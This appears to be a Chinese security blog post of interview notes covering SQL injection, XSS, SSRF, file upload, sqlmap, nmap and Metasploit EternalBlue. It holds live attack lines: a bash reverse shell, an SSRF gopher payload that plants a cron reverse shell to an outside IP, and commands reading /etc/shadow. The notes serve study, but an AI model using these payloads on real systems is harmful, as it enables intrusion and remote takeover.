删除原先对该目标扫描的记录）\n\n2.    --tables      【获取表名\n\n3.    --dbs         【检测站点包含哪些数据库\n\n4.    --current-db    【获取当前的数据库名\n\n5.    --current-user  【检测当前用户\n\n6.    --is-dba   【判断站点的当前用户是否为数据库管理员\n\n7.    --batch      【默认确认，不询问你是否输入\n\n8.    --search  【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）\n\n9.    --threads 10  【线程，sqlmap线程最高设置为10\n\n10.    --level 3        【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头\n                                  的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5\n11.    --risk 3           【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全\n\n12.    -v   【详细的等级(0-6)\n         0：只显示Python的回溯，错误和关键消息。\n         1：显示信息和警告消息。\n         2：显示调试消息。\n         3：有效载荷注入。\n         4：显示HTTP请求。\n         5：显示HTTP响应头。\n         6：显示HTTP响应页面的内容\n\n13.    --privileges  【查看权限\n\n14.    --tamper xx.py,cc.py   【防火墙绕过，后接tamper库中的py文件\n\n15.    --method \"POST\" --data \"page=1&id=2\"   【POST方式提交数据\n\n16.    --threads number　　【采用多线程 后接线程数\n\n17.    --referer  \"\"  【使用referer欺骗\n\n18.    --user-agent \"\"     【自定义user-agent\n\n19.    --proxy “目标地址″   【使用代理注入\n\n1.指定目标url\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.从文件中获取多个url\n\n```\nsqlmap -m 1.txt\n```\n\n3.从文件中加载HTTP请求\n\n```\nsqlmap -r  url.txt\n```\n\n4.利用google获取目标\n\n```\nsqlmap -g \"inurl:\\\".php?id=1\\\"\"\n```\n\n5.从burp日志中获取目标\n\n```\nsqlmap -l    burp.txt\n```\n\n实例演示-sqlmap注入检测\n\n1.GET参数注入\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1\"\n```\n\n2.POST参数注入\n\n```\nsqlmap -u \"http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1\"  --data=\"id=1\"\n```\n\n\n\n1.   sqlmap -u  \"http://www.xx.com?id=x\"    【查询是否存在注入点\n\n2.   --dbs         【检测站点包含哪些数据库\n\n3.   --current-db    【获取当前的数据库名\n\n4.   --tables -D \"db_name\"  【获取指定数据库中的表名 -D后接指定的数据库名称\n\n5.   --columns  -T \"table_name\" -D \"db_name\"  【获取数据库表中的字段\n\n6.   --dump -C \"columns_name\" -T \"table_name\" -D \"db_name\"  【获取字段的数据内容\n\nPOST注入：\n\n    （1）目标地址http:// www.xxx.com /login.asp\n    （2）打开brup代理。\n    （3）点击表单提交\n    （4）burp获取拦截信息（post）\n    （5）右键保存文件（.txt）到指定目录下\n    （6）运行sqlmap并执行如下命令：\n\n用例：sqlmap -r okay.txt  -p  username\n\n// -r表示加载文件(及步骤（5）保存的路径)，-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）\n\n\n\n### AWVS\n\n#### 介绍\n\nAcunetix Web Vulnerability Scanner（AWVS）可以扫描任何通过Web浏览器访问和遵循HTTP/HTTPS规则的Web站点。适用于任何中小型和大型企业的内联网、外延网和面向客户、雇员、厂商和其它人员的Web网站。\n\nAWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。\n\n\n\n#### 功能特点\n\n- 自动的客户端脚本分析器，允许对Ajax和Web2.0应用程序进行安全性测试\n\n- 业内最先进且深入的SQL注入和跨站脚本测试\n\n- 高级渗透测试工具，例如HTPP Editor和HTTP Fuzzer\n\n- 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域\n\n- 支持含有CAPTHCA的页面，单个开始指令和Two Factor（双因素）验证机制\n\n- 丰富的报告功能，包括VISA PCI依从性报告\n\n- 高速的多线程扫描器轻松检索成千上万的页面\n\n- 智能爬行程序检测web服务器类型和应用程序语言\n\n- Acunetix检索并分析网站，包括flash内容，SOAP和AJAX\n\n- 端口扫描web服务器并对在服务器上运行的网络服务执行安全检查\n\n- 可到处网站漏洞文件\n\n\n\n#### 工作原理\n\n- 扫描整个网络，通过跟踪站点上的所有链接和robots.txt来实现扫描，扫描后AWVS就会映射出站点的结构并显示每个文件的细节信息。\n\n- 在上述的发现阶段或者扫描过程之后，AWVS就会自动地对所发现的每一个页面发动一系列的漏洞攻击，这实质上是模拟一个黑客的攻击过程（用自定义的脚本去探测是否有漏洞） 。WVS分析每一个页面中需要输入数据的地方，进而尝试3所有的输入组合。这是一个自动扫描阶段 。\n\n- 在它发现漏洞之后，AWVS就会在“Alerts Node(警告节点)”中报告这些漏洞，每一个警告都包含着漏洞信息和如何修补漏洞的建议。\n\n- 在一次扫描完成之后，它会将结果保存为文件以备日后分析以及与以前的扫描相比较，使用报告工具，就可以创建一个专业的报告来总结这次扫描。\n\n\n\n#### 页面介绍\n\n主菜单功能介绍：主菜单共有5个模块，分别为Dashboard、Targets、Vulnerabilities、Scans和Reports。\n\n- Dashboard：仪表盘，显示扫描过的网站的漏洞信息\n- Targets：目标网站，需要被扫描的网站\n- Vulnerabilities：漏洞，显示所有被扫描出来的网站漏洞\n- Scans：扫描目标站点，从Target里面选择目标站点进行扫描\n- Reports：漏洞扫描完成后生成的报告\n\n设置菜单功能介绍：设置菜单共有8个模块，分别为Users、Scan Types、Network Scanner、Issue Trackers、Email Settings、Engines、Excluded Hours、Proxy Settings\n\n- Users：用户，添加网站的使用者、新增用户身份验证、用户登录会话和锁定设置\n- Scan Types：扫描类型，可根据需要勾选完全扫描、高风险漏洞、跨站点脚本漏洞、SQL 注入漏洞、弱密码、仅爬网、恶意软件扫描\n- Network Scanner：网络扫描仪，配置网络信息包括地址、用户名、密码、端口、协议\n- Issue Trackers：问题跟踪器，可配置问题跟踪平台如github、gitlab、JIRA等\n- Email Settings：邮件设置，配置邮件发送信息\n- Engines：引擎，引擎安装删除禁用设置\n- Excluded Hours：扫描时间设置，可设置空闲时间扫描\n- Proxy Settings：代理设置，设置代理服务器信息\n\n\n\n### APPSCAN\n\n#### 介绍\n\nAppScan是IBM的一款web安全扫描工具，主要适用于Windows系统。该软件内置强大的扫描引擎，可以测试和评估Web服务和应用程序的风险检查，根据网站入口自动对网页链接进行安全扫描，扫描之后会提供扫描报告和修复建议等。\n\n#### 工作原理\n\n1）通过探索了解整个web页面结果\n\n2）通过分析，使用扫描规则库对修改的HTTP Request进行攻击尝试\n\n3）分析 Response 来验证是否存在安全漏洞\n\n\n\n### wireshark\n\n#### 软件功能\n\n1、分析网络底层协议；\n 2、解决网络故障问题；\n 3、找寻网络安全问题；\n\n#### 软件原理\n\n当信息以明文的形式在网络上传输时，便可以使用网络监听的方式来进行攻击。`将网络接口设置在监听模式，便可以将网上传输的源源不断的信息截获。`嗅探技术常常用于网络故障诊断、协议分析、应用性能分析和网络安全保障等各个领域\n\n\n\n#### 过滤\n\n#### 协议过滤\n\ntcp，只显示TCP协议的数据包列表\n http，只查看HTTP协议的数据包列表\n icmp，只显示ICMP协议的数据包列表\n\n####  ip过滤\n\n```\n ip.src ==192.168.1.104 显示源地址为192.168.1.104的数据包列表\n ip.dst==192.168.1.104, 显示目标地址为192.168.1.104的数据包列表\n ip.addr == 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表\n```\n\n#### 端口过滤\n\n```\ntcp.port ==80,  显示源主机或者目的主机端口为80的数据包列表。\ntcp.srcport == 80,  只显示TCP协议的源主机端口为80的数据包列表。\ntcp.dstport == 80，只显示TCP协议的目的主机端口为80的数据包列表。\n```\n\n####  Http模式过滤\n\n```\nhttp.request.method==“GET”, 只显示HTTP GET方法的\n```\n\n#### 逻辑运算符为 and/or/not\n\n过滤多个条件组合时，使用and/or。比如获取IP地址为192.168.1.104的ICMP数据包表达式为：`ip.addr == 192.168.1.104 and icmp`\n\n\n\n### nmap\n\n| 参数(注意区分大小写) | 说明                                                         |\n| -------------------- | ------------------------------------------------------------ |\n| -sT                  | TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。 |\n| -sS                  | 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。 |\n| -sF  -sN             | 秘密FIN数据包扫描、Xmas Tree、Null扫描模式                   |\n| -sP                  | ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。 |\n| -sU                  | UDP扫描，但UDP扫描是不可靠的                                 |\n| -sA                  | 这项高级的扫描方法通常用来穿过防火墙的规则集                 |\n| -sV                  | 探测端口服务版本                                             |\n| -Pn                  | 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描 |\n| -v                   | 显示扫描过程，推荐使用                                       |\n| -h                   | 帮助选项，是最清楚的帮助文档                                 |\n| -p                   | 指定端口，如“1-65535、1433、135、22、80”等                   |\n| -O                   | 启用远程操作系统检测，存在误报                               |\n| -A                   | 全面系统检测、启用脚本检测、扫描等                           |\n| -oN/-oX/-oG          | 将报告写入文件，分别是正常、XML、grepable 三种格式           |\n| -T4                  | 针对TCP端口禁止动态扫描延迟超过10ms                          |\n| -iL                  | 读取主机列表，例如，“-iL C:\\ip.txt”                          |\n\n**1、扫描单个目标**\n\nnmap ip\n\n```\n如：nmap 192.168.0.101\n```\n\n**2、扫描多个目标**\n\nnmap ip1 ip2 适用于目标地址不再同一个网段或在同一网段不连续且数量不多的情况。\n\n```\n如：nmap 192.168.0.101 192.168.0.110\n```\n\n**3、扫描一个范围内的目标**\n\nnmap xxx.xxx.xxx.xxx-xxx\n\n```\n如：nmap 192.168.0.100-110\n```\n\n**4、扫描目标地址所在某网段**\n\nnamp xxx.xxx.xxx.xxx/xx\n\n```\n如：nmap 192.168.0.1/24\n```\n\n**5、扫描包含主机列表的文件中的所有地址**\n\nnmap -iL <File path>\n\n```\n如：nmap -iL /root/target.txt\n```\n\n**6、扫描除了一个目标地址之外的所有地址**\n\nnmap ip段 -exclude 被排除的ip\n\n```\n如：nmap 192.168.0.100-110 -exclude 192.168.0.103\n   nmap 192.168.0.1/24 -exclude 192.168.0.103 \n```\n\n**7、扫描目标地址的指定端口**\n\nnmap ip -p 端口1，端口2，端口3……\n\n```\n如:nmap 192.168.0.101 -p 80,8080,3306,3389\n```\n\n**8、扫描目标地址C段的在线主机**\n\nnmap -sP ip段\n\n```\n如：nmap -sP 192.168.0.1/24\n```\n\n**9、扫描目标地址操作系统版本进行探测**\n\nnmap -O ip\n\n```\n如：nmap -O 192.168.0.101\n```\n\n**10、扫描目标所开放的全部端口（半开式）**\n\nnmap -sS -p 端口号(多个用“,”隔开) -v ip\n\n```\n如：nmap -sS -p 1-65535 192.168.0.101\n```\n\n\n\n### MSF\n\n#### 简介\n\nMetasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。\n\n\n\n它本身附带数百个已知软件漏洞，**是一款专业级漏洞攻击工具**\n\n\n\n#### 使用\n\n根据漏洞名称搜索 : `search ms17_010`\n\n1、运用辅助模块扫描目标\n\n设置模块：`use auxiliary/scanner/smb/smb_ms17_010`\n\n查看设置：`options` \n\n设置目标地址：`set rhosts 192.168.174.129`\n\n目标端口默认是445，如果用nmap端口扫描windows文件共享服务不是开放在445端口上面，那这里需要进行修改，`set rport 目标端口`\n\n设置好了之后，`run`或者`exploit` 进行攻击\n\n\n\n2、设置攻击模块对目标进行攻击\n\n\n\n使用攻击模块：`use exploit/windows/smb/ms17_010_eternalblue`\n\n查看所需设置：`options` \n\n设置目标地址：`set RHOSTS 192.168.174.129`\n\n设置目标端口：`set RPORT 445`\n\n设置payload：`set payload windows/x64/meterpreter/reverse_tcp`\n\n设置本地地址：`set LHOST 192.168.174.192`\n\n攻击：`run`或者`exploit` \n\n\n\n\n\n### Linux命令\n\n**命令：netstat**\n\n用途：查看系统的网络连接状态、路由表、接口统计等信息\n\n格式：netstat [选项]\n\n常用选项：\n\n- -a：显示所有活动连接\n- -n：以数字形式显示\n- -p：显示进程信息\n- -t：查看TCP协议相关信息\n- -u：查看UDP协议相关信息\n- -r：显示路由表信息\n\n\n\n**命令：network**\n\n用途：启用、禁用网络接口配置\n\n重启network格式：service network restart\n\n\n\n**命令：chmod**\n\n用途：权限控制命令\n\nLinux系统下文件权限显示如下图所示，第一个数字，数字代表的意义为：\n\n- – 普通文件\n- d 目录\n- s socket套接字\n- l 软链接\n- p 管道\n- c 字符设备\n- b 块设备\n\n`uname -a`: 此命令可以查看当前Linux系统内核具体版本、使用的发行版版本、以及当前处理器架构!(这里的架构非常重要,大部分针对Linux攻击载荷都需要明确处理器架构才能使用)\n\n存放系统信息的文件\n\n- cat /etc/issue: 连接系统时显示的提示信息,默认一般会存放发行版名称等信息(PS:用户可能会把这个当成备忘录存放一些口令)\n- cat /etc/*-release: 详细的发行版系统版本信息(不同的发行版可能名字会略有不同,并且此文件可能有多个,这种情况下我们可以使用通配符*来解决这个问题。ls /etc | grep \"release\"\"可以使用此命令来查看你系统中此文件夹具体有哪些!)\n- cat /proc/version: 详细的系统内核信息,用于编译内核的gcc的版本以及内核编译的时间。\n- cat /proc/sys/kernel/version: 系统内核信息,相当uname -v(/proc/sys/kernel文件夹中可以监视和调整Linux内核中的各种活动!但需要管理员权限!)\n\n\n\n\n进程信息\n\n    ps: 列出本用户当前使用的终端中运行的进程\n        ps -elf: 显示详细的(-l)带UID,PPIP,C与STIME栏位(-f)现行终端机下的所有进程(-e)\n        ps aux: 已用户为主的格式(u)显示所有用户(a)的所有终端机(x)下的所有进程\n    top: 类似Windows的任务管理器\n\n`cat /etc/passwd`: 可以登录系统或其他拥有正在运行的进程的操作系统的用户身份信息\n\n`cat /etc/shadow`: 所有用户的密码安全策略,一般只有超级用户对此文件夹才有访问权限!\n\n`cat /etc/sudoers`: 对权限的分配管理   \n\n`ifconfig -a`: 查看网络、网卡相关信息\n\n`hostname`: 显示、设置系统的主机名称\n\n\n\n#### 反弹shell\n\n```\nbash -i >& /dev/tcp/192.168.0.4/7777 0>&1\n```\n\n\n\n### OSI模型\n\n![图片-1685330434325](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440002.png)**应用层：为应用程序或用户请求提供各种请求服务。**OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。\n\n**表示层：数据编码、格式转换、数据加密。**提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。\n\n**会话层：创建、管理和维护会话。**接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。\n\n**传输层：数据通信。**建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。\n\n**网络层：IP选址及路由选择。**通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。\n\n**数据链路层：提供介质访问和链路管理。**接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。\n\n**物理层：管理通信设备和网络媒体之间的互联互通。**传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。\n\n\n\n### TCP/IP五层模型\n\n#### ![图片-1685330444867](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151440451.png)区别\n\nTCP/IP协议中的应用层处理开放式系统互联模型（OSI）中的第五层、第六层和第七层的功能。\n\nTCP/IP协议中的传输层不能保证数据包在该层总是能够安全可靠地传输，而开放式系统互联模型（OSI）可以做到。\n\nTCP/IP协议还提供一项名为UDP（用户数据报协议）的选择。\n\n\n\n\n\n### xss，csrf，ssrf区别\n\n**相同点：**\n XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。\n\n**不同点：**\n XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的脚本语句被执行。\n\nCSRF(跨站请求伪造)是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。  \n\nSSRF(服务端请求伪造）是服务器对用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器","slug":"面试prepare","published":1,"updated":"2024-04-17T08:42:59.686Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7jc000th7763ola9iyg","content":"<h1 id=\"面试prepare\"><a href=\"#面试prepare\" class=\"headerlink\" title=\"面试prepare\"></a>面试prepare</h1><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>本人最近准备找一份暑期实习，于是自己写了一份面经</p>\n<p>写的不好，仅供参考</p>\n<h3 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h3><h4 id=\"常见的关系型数据库\"><a href=\"#常见的关系型数据库\" class=\"headerlink\" title=\"常见的关系型数据库\"></a><strong>常见的关系型数据库</strong></h4><p>mysql、sqlserver、oracle、access、sqlite、postgreSQL</p>\n<ul>\n<li><p>mysql:3306 </p>\n</li>\n<li><p>sqlserver:1433 </p>\n</li>\n<li><p>orecal:1521 </p>\n</li>\n<li><p>PostgreSQL:5432 </p>\n</li>\n<li><p>db2:50000</p>\n</li>\n<li><p>MongoDB:27017 </p>\n</li>\n<li><p>redis:6379 </p>\n</li>\n<li><p>memcached:11211</p>\n</li>\n</ul>\n<h4 id=\"SQL注入有哪几种注入类型？\"><a href=\"#SQL注入有哪几种注入类型？\" class=\"headerlink\" title=\"SQL注入有哪几种注入类型？\"></a><strong>SQL注入有哪几种注入类型？</strong></h4><p>从注入参数类型分：数字型注入、字符型注入、搜索型注入<br>从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入 ，</p>\n<p>二次注入（参数传入的恶意数据在传入时被转义，但是在数据库处理时又被还原并存储在数据库中，导致二次注入）</p>\n<p>从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入</p>\n<h4 id=\"SQL注入的危害及防御\"><a href=\"#SQL注入的危害及防御\" class=\"headerlink\" title=\"SQL注入的危害及防御\"></a><strong>SQL注入的危害及防御</strong></h4><p>危害</p>\n<ul>\n<li>数据库泄露 </li>\n<li>数据库被破坏 </li>\n<li>网站崩溃 </li>\n<li>服务器被植入木马</li>\n</ul>\n<p>防御</p>\n<ul>\n<li>代码层面对查询参数进行转义 </li>\n<li>预编译与参数绑定 </li>\n<li>利用WAF防御</li>\n</ul>\n<h4 id=\"sql注入getshell\"><a href=\"#sql注入getshell\" class=\"headerlink\" title=\"sql注入getshell\"></a>sql注入getshell</h4><ul>\n<li>存在SQL注入漏洞</li>\n<li>web目录具有写入权限</li>\n<li>找到网站的绝对路径</li>\n<li>secure_file_priv没有具体值（secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。）</li>\n</ul>\n<h4 id=\"绕过方式\"><a href=\"#绕过方式\" class=\"headerlink\" title=\"绕过方式\"></a>绕过方式</h4><ul>\n<li>大小写</li>\n<li>双写</li>\n<li>注释符  &#x2F;**&#x2F;</li>\n<li>编码绕过 %20 %09 %0a</li>\n<li>括号绕过</li>\n<li>将表明转为十六进制绕过引号</li>\n<li>join绕过逗号</li>\n<li>like绕过等于号</li>\n</ul>\n<h3 id=\"xss\"><a href=\"#xss\" class=\"headerlink\" title=\"xss\"></a>xss</h3><h4 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>xss的本质是javascript代码执行，所以说原理就是用户在可控参数输入恶意的js代码，然后该代码被执行成功</p>\n<h4 id=\"如何验证存在xss漏洞\"><a href=\"#如何验证存在xss漏洞\" class=\"headerlink\" title=\"如何验证存在xss漏洞\"></a>如何验证存在xss漏洞</h4><p>第一步，寻找用户可控的参数（输入点）<br> 第二步，测试特殊符号，单引号、双引号、尖括号等是否被过滤或处理<br> 第三步，根据第二步测试结果进行操作，如过滤了事件类型的关键字，构造新的script标签去形成新的js环境，或者针对一些其它防护进行绕过</p>\n<h4 id=\"xss有哪几种类型\"><a href=\"#xss有哪几种类型\" class=\"headerlink\" title=\"xss有哪几种类型\"></a>xss有哪几种类型</h4><h5 id=\"DOM型XSS\"><a href=\"#DOM型XSS\" class=\"headerlink\" title=\"DOM型XSS\"></a>DOM型XSS</h5><p>攻击者将带有恶意js代码的参数传递到网站的前端页面中，该代码不会传入服务器直接在客户的浏览器执行。</p>\n<h5 id=\"反射性型XSS\"><a href=\"#反射性型XSS\" class=\"headerlink\" title=\"反射性型XSS\"></a>反射性型XSS</h5><p>攻击者将带有恶意js代码的参数传递给网站，经过服务器的然后返回到客户端，在客户的浏览器执行。</p>\n<h5 id=\"存储型XSS\"><a href=\"#存储型XSS\" class=\"headerlink\" title=\"存储型XSS\"></a>存储型XSS</h5><p>攻击者将带有恶意js代码的参数传递给网站，经过服务器存储在数据库中，任何一个客户端在访问该条数据时，恶意的js代码都会在该客户端的浏览器执行。</p>\n<h4 id=\"xss危害\"><a href=\"#xss危害\" class=\"headerlink\" title=\"xss危害\"></a>xss危害</h4><ul>\n<li>盗用用户的COOKIE</li>\n<li>修改DOM</li>\n<li>插入广告（黑页等）</li>\n<li>发动xss蠕虫攻击</li>\n<li>劫持用户行为，进一步渗透内网</li>\n</ul>\n<h4 id=\"xss修复\"><a href=\"#xss修复\" class=\"headerlink\" title=\"xss修复\"></a>xss修复</h4><ul>\n<li>在服务端进行输入检测，过滤特殊字符</li>\n<li>对输出内容进行编码转义</li>\n<li>在html中进行HTMLEncode，javascript中进行JavaScriptEncode，对使用javascriptEncode的变量都放在引号中并转义特殊字符，data部分就无法逃逸出引号成为代码中的一部分了，再严格一些，对所有字母之外的字符使用十六进制编码。</li>\n<li>设置httponly为true</li>\n</ul>\n<h4 id=\"绕过\"><a href=\"#绕过\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><ul>\n<li><p>双写</p>\n</li>\n<li><p>对不能构造script标签的情况下<br>使用事件进行绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;input  value=&#x27;123&#x27; onclick=&#x27;alert()&#x27;&gt;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>超链接绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a src=javascript:alert()&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><h4 id=\"原理-1\"><a href=\"#原理-1\" class=\"headerlink\" title=\"原理\"></a>原理</h4><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>\n<h4 id=\"危害\"><a href=\"#危害\" class=\"headerlink\" title=\"危害\"></a>危害</h4><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>\n<h4 id=\"利用方式\"><a href=\"#利用方式\" class=\"headerlink\" title=\"利用方式\"></a>利用方式</h4><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>\n<p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class=\"line\"> </span><br><span class=\"line\"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class=\"line\"> </span><br><span class=\"line\">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"绕过-1\"><a href=\"#绕过-1\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><p>采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成</p>\n<blockquote>\n<ul>\n<li><p>8进制格式：0300.0250.0.1</p>\n</li>\n<li><p>16进制格式：0xC0.0xA8.0.1</p>\n</li>\n<li><p>10进制整数格式：3232235521</p>\n</li>\n<li><p>16进制整数格式：0xC0A80001</p>\n</li>\n<li><p>合并后两位：1.1.278 &#x2F; 1.1.755</p>\n</li>\n<li><p>合并后三位：1.278 &#x2F; 1.755 &#x2F; 3.14159267</p>\n</li>\n<li><p>0.0.0.0这个IP可以直接访问到本地</p>\n</li>\n<li><p><code>xip.io</code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，</p>\n<p>例如192.168.0.1.xip.io，解析到192.168.0.1。</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"防御方式\"><a href=\"#防御方式\" class=\"headerlink\" title=\"防御方式\"></a>防御方式</h4><blockquote>\n<ul>\n<li>过滤返回的信息</li>\n<li>统一错误信息</li>\n<li>限制请求的端口</li>\n<li>禁止不常用的协议</li>\n<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li>\n</ul>\n</blockquote>\n<ol>\n<li>限制访问方法只能使用GET</li>\n<li>限制访问的协议只能是http或https，其他协议直接拒绝访问</li>\n<li>检测特殊字符CRLF，存在则直接拒绝访问</li>\n<li>设置setInstanceFollowRedirects属性为false，禁止跟随302跳转；禁止跳转的目的是防止攻击者利用跳转访问内网，从而绕过之后的黑名单校验</li>\n<li>解析url中域名对应的ipv4地址：   <ol>\n<li>该地址先过黑名单校验，不允许是内网地址，利用正则表达式对ip进行过滤</li>\n<li><strong>使用ip对url中的域名进行替换，访问资源时都以ip进行访问</strong>；这样可以防御DNS Rebinding类的攻击</li>\n</ol>\n</li>\n</ol>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><h4 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h4><p>用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端的命令。</p>\n<pre><code>常见的安全问题：\n（1）上传的是脚本文件，服务器Web容器解释并执行了用户上传的脚本，导致代码执行。\n（2）上传的文件是病毒、木马，引诱用户或者管理员进行下载执行。\n（3）上传文件是钓鱼图片或者为包含了脚本的图片，在某些版本的浏览器中作为脚本执行，或被用于钓鱼欺诈。\n</code></pre>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404151439718.png\"\n                        alt=\"图片-1685330394483\"\n                 ></p>\n<h4 id=\"文件上传漏洞方式\"><a href=\"#文件上传漏洞方式\" class=\"headerlink\" title=\"文件上传漏洞方式\"></a>文件上传漏洞方式</h4><p>1.客户端方式</p>\n<p>主要方式就是JS检查。<br>绕过：<br>（1）首先选择正常的文件进行上传<br>（2）用BurpSuit进行抓包修改后缀然后完成文件上传.<br>2.绕过文件上传检查功能<br>（1）白名单校对——%00截断</p>\n<p>因为在很多语言中，比如CorPHP等语言的常用字符串处理函数中,0x00都被认为是终止符。如xxx.php%00.jpg，.jpg绕过了应用的上传文件类型判断，但对于服务器来说，此文件因为0x00字符截断的关系，最终会变成xxx.php。<br>原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。</p>\n<h4 id=\"绕过-2\"><a href=\"#绕过-2\" class=\"headerlink\" title=\"绕过\"></a>绕过</h4><h5 id=\"htaccess文件\"><a href=\"#htaccess文件\" class=\"headerlink\" 